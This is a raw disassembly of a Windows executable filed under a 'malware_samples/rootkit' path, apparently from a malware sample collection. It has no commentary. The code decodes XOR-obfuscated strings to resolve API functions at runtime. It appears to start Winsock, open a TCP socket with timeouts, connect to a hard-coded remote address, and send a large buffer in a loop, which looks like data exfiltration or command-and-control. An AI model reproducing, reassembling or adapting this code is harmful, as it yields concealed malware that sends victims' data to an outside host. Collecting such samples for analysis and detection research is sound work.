
malware_samples/rootkit/84ed7fec67de5621806dbb43af5167a5fc60ab7f2403448519dc0eca2b8f9022.exe:     file format pei-x86-64


Disassembly of section .text:

0000000140001000 <.text>:
   140001000:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140001005:	44 89 4c 24 20       	mov    %r9d,0x20(%rsp)
   14000100a:	4c 89 44 24 18       	mov    %r8,0x18(%rsp)
   14000100f:	55                   	push   %rbp
   140001010:	56                   	push   %rsi
   140001011:	57                   	push   %rdi
   140001012:	41 54                	push   %r12
   140001014:	41 55                	push   %r13
   140001016:	41 56                	push   %r14
   140001018:	41 57                	push   %r15
   14000101a:	48 8d ac 24 20 fd ff 	lea    -0x2e0(%rsp),%rbp
   140001021:	ff 
   140001022:	48 81 ec e0 03 00 00 	sub    $0x3e0,%rsp
   140001029:	48 8b 35 c0 7b 01 00 	mov    0x17bc0(%rip),%rsi        # 0x140018bf0
   140001030:	48 8d 85 40 01 00 00 	lea    0x140(%rbp),%rax
   140001037:	33 ff                	xor    %edi,%edi
   140001039:	c7 85 38 03 00 00 80 	movl   $0xbb80,0x338(%rbp)
   140001040:	bb 00 00 
   140001043:	0f 57 c0             	xorps  %xmm0,%xmm0
   140001046:	33 d2                	xor    %edx,%edx
   140001048:	8d 4f 03             	lea    0x3(%rdi),%ecx
   14000104b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140001050:	0f 11 00             	movups %xmm0,(%rax)
   140001053:	0f 11 40 10          	movups %xmm0,0x10(%rax)
   140001057:	0f 11 40 20          	movups %xmm0,0x20(%rax)
   14000105b:	0f 11 40 30          	movups %xmm0,0x30(%rax)
   14000105f:	0f 11 40 40          	movups %xmm0,0x40(%rax)
   140001063:	0f 11 40 50          	movups %xmm0,0x50(%rax)
   140001067:	0f 11 40 60          	movups %xmm0,0x60(%rax)
   14000106b:	48 8d 80 80 00 00 00 	lea    0x80(%rax),%rax
   140001072:	0f 11 40 f0          	movups %xmm0,-0x10(%rax)
   140001076:	48 83 e9 01          	sub    $0x1,%rcx
   14000107a:	75 d4                	jne    0x140001050
   14000107c:	0f 11 00             	movups %xmm0,(%rax)
   14000107f:	48 89 50 10          	mov    %rdx,0x10(%rax)
   140001083:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140001088:	48 b8 50 00 38 17 c8 	movabs $0x654ff2c817380050,%rax
   14000108f:	f2 4f 65 
   140001092:	49 be 07 53 79 44 bc 	movabs $0x113d93bc44795307,%r14
   140001099:	93 3d 11 
   14000109c:	48 89 85 30 03 00 00 	mov    %rax,0x330(%rbp)
   1400010a3:	49 bd c0 a6 21 28 91 	movabs $0x698682912821a6c0,%r13
   1400010aa:	82 86 69 
   1400010ad:	48 8b 85 30 03 00 00 	mov    0x330(%rbp),%rax
   1400010b4:	48 bb 70 20 4b 1b 8f 	movabs $0x7513a18f1b4b2070,%rbx
   1400010bb:	a1 13 75 
   1400010be:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   1400010c3:	49 bf ac ca 21 28 91 	movabs $0x698682912821caac,%r15
   1400010ca:	82 86 69 
   1400010cd:	48 b8 b5 d6 21 28 91 	movabs $0x698682912821d6b5,%rax
   1400010d4:	82 86 69 
   1400010d7:	48 89 85 30 03 00 00 	mov    %rax,0x330(%rbp)
   1400010de:	48 8b 85 30 03 00 00 	mov    0x330(%rbp),%rax
   1400010e5:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   1400010ea:	4c 89 b5 30 03 00 00 	mov    %r14,0x330(%rbp)
   1400010f1:	48 8b 85 30 03 00 00 	mov    0x330(%rbp),%rax
   1400010f8:	4c 89 ad 30 03 00 00 	mov    %r13,0x330(%rbp)
   1400010ff:	48 89 45 40          	mov    %rax,0x40(%rbp)
   140001103:	48 8b 85 30 03 00 00 	mov    0x330(%rbp),%rax
   14000110a:	66 0f 6f 44 24 40    	movdqa 0x40(%rsp),%xmm0
   140001110:	48 89 45 48          	mov    %rax,0x48(%rbp)
   140001114:	66 0f ef 45 40       	pxor   0x40(%rbp),%xmm0
   140001119:	66 0f 7f 44 24 40    	movdqa %xmm0,0x40(%rsp)
   14000111f:	48 89 9d 30 03 00 00 	mov    %rbx,0x330(%rbp)
   140001126:	48 8b 85 30 03 00 00 	mov    0x330(%rbp),%rax
   14000112d:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   140001132:	4c 89 bd 30 03 00 00 	mov    %r15,0x330(%rbp)
   140001139:	48 8b 85 30 03 00 00 	mov    0x330(%rbp),%rax
   140001140:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   140001145:	4c 89 b5 30 03 00 00 	mov    %r14,0x330(%rbp)
   14000114c:	48 8b 85 30 03 00 00 	mov    0x330(%rbp),%rax
   140001153:	48 89 45 50          	mov    %rax,0x50(%rbp)
   140001157:	4c 89 ad 30 03 00 00 	mov    %r13,0x330(%rbp)
   14000115e:	48 8b 85 30 03 00 00 	mov    0x330(%rbp),%rax
   140001165:	66 0f 6f 44 24 30    	movdqa 0x30(%rsp),%xmm0
   14000116b:	48 89 45 58          	mov    %rax,0x58(%rbp)
   14000116f:	66 0f ef 45 50       	pxor   0x50(%rbp),%xmm0
   140001174:	66 0f 7f 44 24 30    	movdqa %xmm0,0x30(%rsp)
   14000117a:	ff 15 80 ce 00 00    	call   *0xce80(%rip)        # 0x14000e000
   140001180:	48 8b c8             	mov    %rax,%rcx
   140001183:	48 8d 54 24 40       	lea    0x40(%rsp),%rdx
   140001188:	ff 15 7a ce 00 00    	call   *0xce7a(%rip)        # 0x14000e008
   14000118e:	b9 02 02 00 00       	mov    $0x202,%ecx
   140001193:	48 8d 95 40 01 00 00 	lea    0x140(%rbp),%rdx
   14000119a:	ff d0                	call   *%rax
   14000119c:	c7 45 34 6e 2a 04 18 	movl   $0x18042a6e,0x34(%rbp)
   1400011a3:	41 bc 02 00 00 00    	mov    $0x2,%r12d
   1400011a9:	c7 45 30 02 00 1e 14 	movl   $0x141e0002,0x30(%rbp)
   1400011b0:	48 85 f6             	test   %rsi,%rsi
   1400011b3:	0f 84 7b 07 00 00    	je     0x140001934
   1400011b9:	48 b8 74 3c 1a 2f d9 	movabs $0x113de7d92f1a3c74,%rax
   1400011c0:	e7 3d 11 
   1400011c3:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   1400011c8:	48 89 85 30 03 00 00 	mov    %rax,0x330(%rbp)
   1400011cf:	48 8b 85 30 03 00 00 	mov    0x330(%rbp),%rax
   1400011d6:	48 89 44 24 60       	mov    %rax,0x60(%rsp)
   1400011db:	4c 89 ad 30 03 00 00 	mov    %r13,0x330(%rbp)
   1400011e2:	48 8b 85 30 03 00 00 	mov    0x330(%rbp),%rax
   1400011e9:	48 89 44 24 68       	mov    %rax,0x68(%rsp)
   1400011ee:	4c 89 b5 30 03 00 00 	mov    %r14,0x330(%rbp)
   1400011f5:	48 8b 85 30 03 00 00 	mov    0x330(%rbp),%rax
   1400011fc:	4c 89 ad 30 03 00 00 	mov    %r13,0x330(%rbp)
   140001203:	48 89 45 60          	mov    %rax,0x60(%rbp)
   140001207:	48 8b 85 30 03 00 00 	mov    0x330(%rbp),%rax
   14000120e:	66 0f 6f 44 24 60    	movdqa 0x60(%rsp),%xmm0
   140001214:	48 89 45 68          	mov    %rax,0x68(%rbp)
   140001218:	66 0f ef 45 60       	pxor   0x60(%rbp),%xmm0
   14000121d:	66 0f 7f 44 24 60    	movdqa %xmm0,0x60(%rsp)
   140001223:	48 89 9d 30 03 00 00 	mov    %rbx,0x330(%rbp)
   14000122a:	48 8b 85 30 03 00 00 	mov    0x330(%rbp),%rax
   140001231:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   140001236:	4c 89 bd 30 03 00 00 	mov    %r15,0x330(%rbp)
   14000123d:	48 8b 85 30 03 00 00 	mov    0x330(%rbp),%rax
   140001244:	48 89 44 24 58       	mov    %rax,0x58(%rsp)
   140001249:	4c 89 b5 30 03 00 00 	mov    %r14,0x330(%rbp)
   140001250:	48 8b 85 30 03 00 00 	mov    0x330(%rbp),%rax
   140001257:	48 89 45 70          	mov    %rax,0x70(%rbp)
   14000125b:	4c 89 ad 30 03 00 00 	mov    %r13,0x330(%rbp)
   140001262:	48 8b 85 30 03 00 00 	mov    0x330(%rbp),%rax
   140001269:	66 0f 6f 44 24 50    	movdqa 0x50(%rsp),%xmm0
   14000126f:	48 89 45 78          	mov    %rax,0x78(%rbp)
   140001273:	66 0f ef 45 70       	pxor   0x70(%rbp),%xmm0
   140001278:	66 0f 7f 44 24 50    	movdqa %xmm0,0x50(%rsp)
   14000127e:	ff 15 7c cd 00 00    	call   *0xcd7c(%rip)        # 0x14000e000
   140001284:	48 8b c8             	mov    %rax,%rcx
   140001287:	48 8d 54 24 60       	lea    0x60(%rsp),%rdx
   14000128c:	ff 15 76 cd 00 00    	call   *0xcd76(%rip)        # 0x14000e008
   140001292:	45 33 c0             	xor    %r8d,%r8d
   140001295:	41 8d 54 24 ff       	lea    -0x1(%r12),%edx
   14000129a:	41 8b cc             	mov    %r12d,%ecx
   14000129d:	ff d0                	call   *%rax
   14000129f:	4c 8b f8             	mov    %rax,%r15
   1400012a2:	48 89 85 40 03 00 00 	mov    %rax,0x340(%rbp)
   1400012a9:	49 bc 74 36 0d 37 d3 	movabs $0x7e56f0d3370d3674,%r12
   1400012b0:	f0 56 7e 
   1400012b3:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   1400012b8:	4c 89 a5 30 03 00 00 	mov    %r12,0x330(%rbp)
   1400012bf:	48 bb b0 d2 21 28 91 	movabs $0x698682912821d2b0,%rbx
   1400012c6:	82 86 69 
   1400012c9:	48 8b 85 30 03 00 00 	mov    0x330(%rbp),%rax
   1400012d0:	48 89 45 80          	mov    %rax,-0x80(%rbp)
   1400012d4:	48 89 9d 30 03 00 00 	mov    %rbx,0x330(%rbp)
   1400012db:	48 8b 85 30 03 00 00 	mov    0x330(%rbp),%rax
   1400012e2:	48 89 45 88          	mov    %rax,-0x78(%rbp)
   1400012e6:	4c 89 b5 30 03 00 00 	mov    %r14,0x330(%rbp)
   1400012ed:	48 8b 85 30 03 00 00 	mov    0x330(%rbp),%rax
   1400012f4:	48 89 85 80 00 00 00 	mov    %rax,0x80(%rbp)
   1400012fb:	4c 89 ad 30 03 00 00 	mov    %r13,0x330(%rbp)
   140001302:	48 8b 85 30 03 00 00 	mov    0x330(%rbp),%rax
   140001309:	66 0f 6f 45 80       	movdqa -0x80(%rbp),%xmm0
   14000130e:	48 89 85 88 00 00 00 	mov    %rax,0x88(%rbp)
   140001315:	48 b8 70 20 4b 1b 8f 	movabs $0x7513a18f1b4b2070,%rax
   14000131c:	a1 13 75 
   14000131f:	66 0f ef 85 80 00 00 	pxor   0x80(%rbp),%xmm0
   140001326:	00 
   140001327:	66 0f 7f 45 80       	movdqa %xmm0,-0x80(%rbp)
   14000132c:	48 89 85 30 03 00 00 	mov    %rax,0x330(%rbp)
   140001333:	48 8b 85 30 03 00 00 	mov    0x330(%rbp),%rax
   14000133a:	48 89 44 24 70       	mov    %rax,0x70(%rsp)
   14000133f:	48 b8 ac ca 21 28 91 	movabs $0x698682912821caac,%rax
   140001346:	82 86 69 
   140001349:	48 89 85 30 03 00 00 	mov    %rax,0x330(%rbp)
   140001350:	48 8b 85 30 03 00 00 	mov    0x330(%rbp),%rax
   140001357:	48 89 44 24 78       	mov    %rax,0x78(%rsp)
   14000135c:	4c 89 b5 30 03 00 00 	mov    %r14,0x330(%rbp)
   140001363:	48 8b 85 30 03 00 00 	mov    0x330(%rbp),%rax
   14000136a:	48 89 85 90 00 00 00 	mov    %rax,0x90(%rbp)
   140001371:	4c 89 ad 30 03 00 00 	mov    %r13,0x330(%rbp)
   140001378:	48 8b 85 30 03 00 00 	mov    0x330(%rbp),%rax
   14000137f:	66 0f 6f 44 24 70    	movdqa 0x70(%rsp),%xmm0
   140001385:	48 89 85 98 00 00 00 	mov    %rax,0x98(%rbp)
   14000138c:	66 0f ef 85 90 00 00 	pxor   0x90(%rbp),%xmm0
   140001393:	00 
   140001394:	66 0f 7f 44 24 70    	movdqa %xmm0,0x70(%rsp)
   14000139a:	ff 15 60 cc 00 00    	call   *0xcc60(%rip)        # 0x14000e000
   1400013a0:	48 8b c8             	mov    %rax,%rcx
   1400013a3:	48 8d 55 80          	lea    -0x80(%rbp),%rdx
   1400013a7:	ff 15 5b cc 00 00    	call   *0xcc5b(%rip)        # 0x14000e008
   1400013ad:	4d 63 f7             	movslq %r15d,%r14
   1400013b0:	4c 8d 8d 38 03 00 00 	lea    0x338(%rbp),%r9
   1400013b7:	49 8b ce             	mov    %r14,%rcx
   1400013ba:	c7 44 24 20 04 00 00 	movl   $0x4,0x20(%rsp)
   1400013c1:	00 
   1400013c2:	ba ff ff 00 00       	mov    $0xffff,%edx
   1400013c7:	41 b8 05 10 00 00    	mov    $0x1005,%r8d
   1400013cd:	ff d0                	call   *%rax
   1400013cf:	4c 89 a5 30 03 00 00 	mov    %r12,0x330(%rbp)
   1400013d6:	48 8d 4d 90          	lea    -0x70(%rbp),%rcx
   1400013da:	48 8b 85 30 03 00 00 	mov    0x330(%rbp),%rax
   1400013e1:	49 bc 07 53 79 44 bc 	movabs $0x113d93bc44795307,%r12
   1400013e8:	93 3d 11 
   1400013eb:	48 89 45 a0          	mov    %rax,-0x60(%rbp)
   1400013ef:	48 89 9d 30 03 00 00 	mov    %rbx,0x330(%rbp)
   1400013f6:	48 bb 70 20 4b 1b 8f 	movabs $0x7513a18f1b4b2070,%rbx
   1400013fd:	a1 13 75 
   140001400:	48 8b 85 30 03 00 00 	mov    0x330(%rbp),%rax
   140001407:	48 89 45 a8          	mov    %rax,-0x58(%rbp)
   14000140b:	4c 89 a5 30 03 00 00 	mov    %r12,0x330(%rbp)
   140001412:	48 8b 85 30 03 00 00 	mov    0x330(%rbp),%rax
   140001419:	4c 89 ad 30 03 00 00 	mov    %r13,0x330(%rbp)
   140001420:	48 89 85 a0 00 00 00 	mov    %rax,0xa0(%rbp)
   140001427:	48 8b 85 30 03 00 00 	mov    0x330(%rbp),%rax
   14000142e:	66 0f 6f 45 a0       	movdqa -0x60(%rbp),%xmm0
   140001433:	48 89 85 a8 00 00 00 	mov    %rax,0xa8(%rbp)
   14000143a:	66 0f ef 85 a0 00 00 	pxor   0xa0(%rbp),%xmm0
   140001441:	00 
   140001442:	66 0f 7f 45 a0       	movdqa %xmm0,-0x60(%rbp)
   140001447:	48 89 9d 30 03 00 00 	mov    %rbx,0x330(%rbp)
   14000144e:	48 8b 85 30 03 00 00 	mov    0x330(%rbp),%rax
   140001455:	48 89 45 90          	mov    %rax,-0x70(%rbp)
   140001459:	48 b8 ac ca 21 28 91 	movabs $0x698682912821caac,%rax
   140001460:	82 86 69 
   140001463:	48 89 85 30 03 00 00 	mov    %rax,0x330(%rbp)
   14000146a:	48 8b 85 30 03 00 00 	mov    0x330(%rbp),%rax
   140001471:	48 89 45 98          	mov    %rax,-0x68(%rbp)
   140001475:	4c 89 a5 30 03 00 00 	mov    %r12,0x330(%rbp)
   14000147c:	48 8b 85 30 03 00 00 	mov    0x330(%rbp),%rax
   140001483:	48 89 85 b0 00 00 00 	mov    %rax,0xb0(%rbp)
   14000148a:	4c 89 ad 30 03 00 00 	mov    %r13,0x330(%rbp)
   140001491:	48 8b 85 30 03 00 00 	mov    0x330(%rbp),%rax
   140001498:	66 0f 6f 45 90       	movdqa -0x70(%rbp),%xmm0
   14000149d:	48 89 85 b8 00 00 00 	mov    %rax,0xb8(%rbp)
   1400014a4:	66 0f ef 85 b0 00 00 	pxor   0xb0(%rbp),%xmm0
   1400014ab:	00 
   1400014ac:	66 0f 7f 45 90       	movdqa %xmm0,-0x70(%rbp)
   1400014b1:	ff 15 49 cb 00 00    	call   *0xcb49(%rip)        # 0x14000e000
   1400014b7:	48 8b c8             	mov    %rax,%rcx
   1400014ba:	48 8d 55 a0          	lea    -0x60(%rbp),%rdx
   1400014be:	ff 15 44 cb 00 00    	call   *0xcb44(%rip)        # 0x14000e008
   1400014c4:	4c 8d 8d 38 03 00 00 	lea    0x338(%rbp),%r9
   1400014cb:	c7 44 24 20 04 00 00 	movl   $0x4,0x20(%rsp)
   1400014d2:	00 
   1400014d3:	ba ff ff 00 00       	mov    $0xffff,%edx
   1400014d8:	41 b8 06 10 00 00    	mov    $0x1006,%r8d
   1400014de:	49 8b ce             	mov    %r14,%rcx
   1400014e1:	ff d0                	call   *%rax
   1400014e3:	48 b8 64 3c 17 2a d9 	movabs $0x1149f0d92a173c64,%rax
   1400014ea:	f0 49 11 
   1400014ed:	48 89 85 30 03 00 00 	mov    %rax,0x330(%rbp)
   1400014f4:	48 8b 85 30 03 00 00 	mov    0x330(%rbp),%rax
   1400014fb:	48 89 45 c0          	mov    %rax,-0x40(%rbp)
   1400014ff:	4c 89 ad 30 03 00 00 	mov    %r13,0x330(%rbp)
   140001506:	48 8b 85 30 03 00 00 	mov    0x330(%rbp),%rax
   14000150d:	48 89 45 c8          	mov    %rax,-0x38(%rbp)
   140001511:	4c 89 a5 30 03 00 00 	mov    %r12,0x330(%rbp)
   140001518:	48 8b 85 30 03 00 00 	mov    0x330(%rbp),%rax
   14000151f:	4c 89 ad 30 03 00 00 	mov    %r13,0x330(%rbp)
   140001526:	48 89 85 c0 00 00 00 	mov    %rax,0xc0(%rbp)
   14000152d:	48 8b 85 30 03 00 00 	mov    0x330(%rbp),%rax
   140001534:	66 0f 6f 45 c0       	movdqa -0x40(%rbp),%xmm0
   140001539:	48 89 85 c8 00 00 00 	mov    %rax,0xc8(%rbp)
   140001540:	66 0f ef 85 c0 00 00 	pxor   0xc0(%rbp),%xmm0
   140001547:	00 
   140001548:	66 0f 7f 45 c0       	movdqa %xmm0,-0x40(%rbp)
   14000154d:	48 89 9d 30 03 00 00 	mov    %rbx,0x330(%rbp)
   140001554:	48 8b 85 30 03 00 00 	mov    0x330(%rbp),%rax
   14000155b:	48 89 45 b0          	mov    %rax,-0x50(%rbp)
   14000155f:	48 b8 ac ca 21 28 91 	movabs $0x698682912821caac,%rax
   140001566:	82 86 69 
   140001569:	48 89 85 30 03 00 00 	mov    %rax,0x330(%rbp)
   140001570:	48 8b 85 30 03 00 00 	mov    0x330(%rbp),%rax
   140001577:	48 89 45 b8          	mov    %rax,-0x48(%rbp)
   14000157b:	4c 89 a5 30 03 00 00 	mov    %r12,0x330(%rbp)
   140001582:	48 8b 85 30 03 00 00 	mov    0x330(%rbp),%rax
   140001589:	48 89 85 d0 00 00 00 	mov    %rax,0xd0(%rbp)
   140001590:	4c 89 ad 30 03 00 00 	mov    %r13,0x330(%rbp)
   140001597:	48 8b 85 30 03 00 00 	mov    0x330(%rbp),%rax
   14000159e:	66 0f 6f 45 b0       	movdqa -0x50(%rbp),%xmm0
   1400015a3:	48 89 85 d8 00 00 00 	mov    %rax,0xd8(%rbp)
   1400015aa:	66 0f ef 85 d0 00 00 	pxor   0xd0(%rbp),%xmm0
   1400015b1:	00 
   1400015b2:	48 8d 4d b0          	lea    -0x50(%rbp),%rcx
   1400015b6:	66 0f 7f 45 b0       	movdqa %xmm0,-0x50(%rbp)
   1400015bb:	ff 15 3f ca 00 00    	call   *0xca3f(%rip)        # 0x14000e000
   1400015c1:	48 8b c8             	mov    %rax,%rcx
   1400015c4:	48 8d 55 c0          	lea    -0x40(%rbp),%rdx
   1400015c8:	ff 15 3a ca 00 00    	call   *0xca3a(%rip)        # 0x14000e008
   1400015ce:	41 b8 10 00 00 00    	mov    $0x10,%r8d
   1400015d4:	48 8d 55 30          	lea    0x30(%rbp),%rdx
   1400015d8:	49 8b ce             	mov    %r14,%rcx
   1400015db:	ff d0                	call   *%rax
   1400015dd:	83 f8 ff             	cmp    $0xffffffff,%eax
   1400015e0:	0f 84 4e 03 00 00    	je     0x140001934
   1400015e6:	48 b8 74 36 17 20 bc 	movabs $0x113d93bc20173674,%rax
   1400015ed:	93 3d 11 
   1400015f0:	48 8d 4d d0          	lea    -0x30(%rbp),%rcx
   1400015f4:	48 89 85 30 03 00 00 	mov    %rax,0x330(%rbp)
   1400015fb:	48 8b 85 30 03 00 00 	mov    0x330(%rbp),%rax
   140001602:	48 89 45 e0          	mov    %rax,-0x20(%rbp)
   140001606:	4c 89 ad 30 03 00 00 	mov    %r13,0x330(%rbp)
   14000160d:	48 8b 85 30 03 00 00 	mov    0x330(%rbp),%rax
   140001614:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
   140001618:	4c 89 a5 30 03 00 00 	mov    %r12,0x330(%rbp)
   14000161f:	48 8b 85 30 03 00 00 	mov    0x330(%rbp),%rax
   140001626:	4c 89 ad 30 03 00 00 	mov    %r13,0x330(%rbp)
   14000162d:	48 89 85 e0 00 00 00 	mov    %rax,0xe0(%rbp)
   140001634:	48 8b 85 30 03 00 00 	mov    0x330(%rbp),%rax
   14000163b:	66 0f 6f 45 e0       	movdqa -0x20(%rbp),%xmm0
   140001640:	48 89 85 e8 00 00 00 	mov    %rax,0xe8(%rbp)
   140001647:	66 0f ef 85 e0 00 00 	pxor   0xe0(%rbp),%xmm0
   14000164e:	00 
   14000164f:	66 0f 7f 45 e0       	movdqa %xmm0,-0x20(%rbp)
   140001654:	48 89 9d 30 03 00 00 	mov    %rbx,0x330(%rbp)
   14000165b:	48 8b 85 30 03 00 00 	mov    0x330(%rbp),%rax
   140001662:	48 89 45 d0          	mov    %rax,-0x30(%rbp)
   140001666:	48 b8 ac ca 21 28 91 	movabs $0x698682912821caac,%rax
   14000166d:	82 86 69 
   140001670:	48 89 85 30 03 00 00 	mov    %rax,0x330(%rbp)
   140001677:	48 8b 85 30 03 00 00 	mov    0x330(%rbp),%rax
   14000167e:	48 89 45 d8          	mov    %rax,-0x28(%rbp)
   140001682:	4c 89 a5 30 03 00 00 	mov    %r12,0x330(%rbp)
   140001689:	48 8b 85 30 03 00 00 	mov    0x330(%rbp),%rax
   140001690:	48 89 85 f0 00 00 00 	mov    %rax,0xf0(%rbp)
   140001697:	4c 89 ad 30 03 00 00 	mov    %r13,0x330(%rbp)
   14000169e:	48 8b 85 30 03 00 00 	mov    0x330(%rbp),%rax
   1400016a5:	66 0f 6f 45 d0       	movdqa -0x30(%rbp),%xmm0
   1400016aa:	48 89 85 f8 00 00 00 	mov    %rax,0xf8(%rbp)
   1400016b1:	66 0f ef 85 f0 00 00 	pxor   0xf0(%rbp),%xmm0
   1400016b8:	00 
   1400016b9:	66 0f 7f 45 d0       	movdqa %xmm0,-0x30(%rbp)
   1400016be:	ff 15 3c c9 00 00    	call   *0xc93c(%rip)        # 0x14000e000
   1400016c4:	48 8b c8             	mov    %rax,%rcx
   1400016c7:	48 8d 55 e0          	lea    -0x20(%rbp),%rdx
   1400016cb:	ff 15 37 c9 00 00    	call   *0xc937(%rip)        # 0x14000e008
   1400016d1:	45 33 c9             	xor    %r9d,%r9d
   1400016d4:	48 8d 15 25 63 01 00 	lea    0x16325(%rip),%rdx        # 0x140017a00
   1400016db:	49 8b ce             	mov    %r14,%rcx
   1400016de:	45 8d 41 04          	lea    0x4(%r9),%r8d
   1400016e2:	ff d0                	call   *%rax
   1400016e4:	83 f8 ff             	cmp    $0xffffffff,%eax
   1400016e7:	0f 84 47 02 00 00    	je     0x140001934
   1400016ed:	bb ff ff 4f 00       	mov    $0x4fffff,%ebx
   1400016f2:	48 b8 75 36 1a 32 bc 	movabs $0x113d93bc321a3675,%rax
   1400016f9:	93 3d 11 
   1400016fc:	49 bf 70 20 4b 1b 8f 	movabs $0x7513a18f1b4b2070,%r15
   140001703:	a1 13 75 
   140001706:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000170d:	00 00 00 
   140001710:	48 89 85 30 03 00 00 	mov    %rax,0x330(%rbp)
   140001717:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   14000171b:	48 8b 85 30 03 00 00 	mov    0x330(%rbp),%rax
   140001722:	48 89 45 00          	mov    %rax,0x0(%rbp)
   140001726:	4c 89 ad 30 03 00 00 	mov    %r13,0x330(%rbp)
   14000172d:	48 8b 85 30 03 00 00 	mov    0x330(%rbp),%rax
   140001734:	48 89 45 08          	mov    %rax,0x8(%rbp)
   140001738:	4c 89 a5 30 03 00 00 	mov    %r12,0x330(%rbp)
   14000173f:	48 8b 85 30 03 00 00 	mov    0x330(%rbp),%rax
   140001746:	4c 89 ad 30 03 00 00 	mov    %r13,0x330(%rbp)
   14000174d:	48 89 85 00 01 00 00 	mov    %rax,0x100(%rbp)
   140001754:	48 8b 85 30 03 00 00 	mov    0x330(%rbp),%rax
   14000175b:	66 0f 6f 45 00       	movdqa 0x0(%rbp),%xmm0
   140001760:	48 89 85 08 01 00 00 	mov    %rax,0x108(%rbp)
   140001767:	66 0f ef 85 00 01 00 	pxor   0x100(%rbp),%xmm0
   14000176e:	00 
   14000176f:	66 0f 7f 45 00       	movdqa %xmm0,0x0(%rbp)
   140001774:	4c 89 bd 30 03 00 00 	mov    %r15,0x330(%rbp)
   14000177b:	48 8b 85 30 03 00 00 	mov    0x330(%rbp),%rax
   140001782:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   140001786:	48 b8 ac ca 21 28 91 	movabs $0x698682912821caac,%rax
   14000178d:	82 86 69 
   140001790:	48 89 85 30 03 00 00 	mov    %rax,0x330(%rbp)
   140001797:	48 8b 85 30 03 00 00 	mov    0x330(%rbp),%rax
   14000179e:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
   1400017a2:	4c 89 a5 30 03 00 00 	mov    %r12,0x330(%rbp)
   1400017a9:	48 8b 85 30 03 00 00 	mov    0x330(%rbp),%rax
   1400017b0:	48 89 85 10 01 00 00 	mov    %rax,0x110(%rbp)
   1400017b7:	4c 89 ad 30 03 00 00 	mov    %r13,0x330(%rbp)
   1400017be:	48 8b 85 30 03 00 00 	mov    0x330(%rbp),%rax
   1400017c5:	66 0f 6f 45 f0       	movdqa -0x10(%rbp),%xmm0
   1400017ca:	48 89 85 18 01 00 00 	mov    %rax,0x118(%rbp)
   1400017d1:	66 0f ef 85 10 01 00 	pxor   0x110(%rbp),%xmm0
   1400017d8:	00 
   1400017d9:	66 0f 7f 45 f0       	movdqa %xmm0,-0x10(%rbp)
   1400017de:	ff 15 1c c8 00 00    	call   *0xc81c(%rip)        # 0x14000e000
   1400017e4:	48 8b c8             	mov    %rax,%rcx
   1400017e7:	48 8d 55 00          	lea    0x0(%rbp),%rdx
   1400017eb:	ff 15 17 c8 00 00    	call   *0xc817(%rip)        # 0x14000e008
   1400017f1:	45 33 c9             	xor    %r9d,%r9d
   1400017f4:	44 8b c3             	mov    %ebx,%r8d
   1400017f7:	48 8b d6             	mov    %rsi,%rdx
   1400017fa:	49 8b ce             	mov    %r14,%rcx
   1400017fd:	ff d0                	call   *%rax
   1400017ff:	48 63 c8             	movslq %eax,%rcx
   140001802:	8d 41 01             	lea    0x1(%rcx),%eax
   140001805:	83 f8 01             	cmp    $0x1,%eax
   140001808:	76 1f                	jbe    0x140001829
   14000180a:	03 f9                	add    %ecx,%edi
   14000180c:	bb ff ff 4f 00       	mov    $0x4fffff,%ebx
   140001811:	2b df                	sub    %edi,%ebx
   140001813:	48 03 f1             	add    %rcx,%rsi
   140001816:	48 b8 75 36 1a 32 bc 	movabs $0x113d93bc321a3675,%rax
   14000181d:	93 3d 11 
   140001820:	83 fb 05             	cmp    $0x5,%ebx
   140001823:	0f 8d e7 fe ff ff    	jge    0x140001710
   140001829:	83 bd 40 03 00 00 00 	cmpl   $0x0,0x340(%rbp)
   140001830:	0f 84 fa 00 00 00    	je     0x140001930
   140001836:	48 b8 64 3f 16 37 d9 	movabs $0x7252e0d937163f64,%rax
   14000183d:	e0 52 72 
   140001840:	48 8d 4d 10          	lea    0x10(%rbp),%rcx
   140001844:	48 89 85 30 03 00 00 	mov    %rax,0x330(%rbp)
   14000184b:	48 8b 85 30 03 00 00 	mov    0x330(%rbp),%rax
   140001852:	48 89 45 20          	mov    %rax,0x20(%rbp)
   140001856:	48 b8 ab c3 55 28 91 	movabs $0x698682912855c3ab,%rax
   14000185d:	82 86 69 
   140001860:	48 89 85 30 03 00 00 	mov    %rax,0x330(%rbp)
   140001867:	48 8b 85 30 03 00 00 	mov    0x330(%rbp),%rax
   14000186e:	48 89 45 28          	mov    %rax,0x28(%rbp)
   140001872:	4c 89 a5 30 03 00 00 	mov    %r12,0x330(%rbp)
   140001879:	48 8b 85 30 03 00 00 	mov    0x330(%rbp),%rax
   140001880:	4c 89 ad 30 03 00 00 	mov    %r13,0x330(%rbp)
   140001887:	48 89 85 20 01 00 00 	mov    %rax,0x120(%rbp)
   14000188e:	48 8b 85 30 03 00 00 	mov    0x330(%rbp),%rax
   140001895:	66 0f 6f 45 20       	movdqa 0x20(%rbp),%xmm0
   14000189a:	48 89 85 28 01 00 00 	mov    %rax,0x128(%rbp)
   1400018a1:	66 0f ef 85 20 01 00 	pxor   0x120(%rbp),%xmm0
   1400018a8:	00 
   1400018a9:	66 0f 7f 45 20       	movdqa %xmm0,0x20(%rbp)
   1400018ae:	4c 89 bd 30 03 00 00 	mov    %r15,0x330(%rbp)
   1400018b5:	48 8b 85 30 03 00 00 	mov    0x330(%rbp),%rax
   1400018bc:	48 89 45 10          	mov    %rax,0x10(%rbp)
   1400018c0:	48 b8 ac ca 21 28 91 	movabs $0x698682912821caac,%rax
   1400018c7:	82 86 69 
   1400018ca:	48 89 85 30 03 00 00 	mov    %rax,0x330(%rbp)
   1400018d1:	48 8b 85 30 03 00 00 	mov    0x330(%rbp),%rax
   1400018d8:	48 89 45 18          	mov    %rax,0x18(%rbp)
